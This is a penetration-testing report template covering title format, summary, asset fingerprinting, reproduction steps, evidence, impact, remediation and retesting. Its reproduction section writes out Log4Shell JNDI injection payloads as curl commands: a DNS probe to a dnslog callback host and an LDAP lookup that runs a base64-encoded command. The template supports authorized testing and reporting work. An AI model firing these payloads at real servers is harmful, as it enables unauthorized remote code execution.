---
id: "report-template"
title: "Vulnerability report template"
kind: "workflow"
cve: null
related-cves: null
cve-note: "None"
severity: "info"
cvss: 0
severity-basis: "cvss"
severity-note: null
product: "Methodology"
versions: "-"
ports: "Any"
keywords: "report, template, cvss, remediation"
entry: "Vulnerability reporting and retesting workflow"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business-logic / implementation / configuration flaws without CVEs; see references below)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Title

`<asset>: <component> <vulnerability name> (<CVE>) leads to <impact, such as unauthenticated RCE>`

## 1. Summary (three lines maximum)

- Impact: who can exploit it and what they obtain (unauthenticated / low privilege → SYSTEM / domain administrator).
- Conditions: exposed surface + version + prerequisites (outbound access, NLA, debug).
- Conclusion: verified / unable to verify (state the blocker).

## 2. Asset and fingerprints

| Item | Value |
|---|---|
| Target | `https://x.x.x.x:8443` |
| Component | `Apache Log4j2 2.14.1` (evidence: `jar` name / error stack) |
| Exposure | Public / internal / local only |
| Existing protection | WAF / reverse proxy / none |

## 3. Reproduction (minimal steps)

```bash
# 1) Version evidence
curl -sI https://target/ | grep -i '^server'

# 2) Probe (L2)
curl -s https://target/ -H 'User-Agent: ${jndi:dns://xxxx.dnslog.cn}'

# 3) Exploitation (L3, state authorization)
curl -s https://target/ -H 'User-Agent: ${jndi:ldap://.../Basic/Command/base64/aWQ=}'
```

## 4. Evidence

- Raw requests/responses (code blocks, not screenshots).
- DNS/LDAP callback records, command output, timestamps.

## 5. Impact analysis

- Data: what can be read/modified (example table names and file paths).
- Privileges: the reachable level (host / domain / cloud account).
- Lateral movement: list other assets accessible with the same credentials.

## 6. Remediation recommendations

1. Immediate: upgrade to `<fixed version>` (specify the CVE's fixed version).
2. Mitigation (if immediate upgrading is impossible): disable the entry point, apply WAF rules, network ACLs, or temporary configuration changes.
3. Hardening: least privilege and logging/alert rules (specific event IDs / fields).

## 7. Retesting

- Retest commands (same as section 3).
- Retest result: `fixed / partially fixed / not fixed` (include response differences).

## 8. Appendix

- Timeline, participants, cleanup records, reference links (NVD / vendor advisories / analyses).
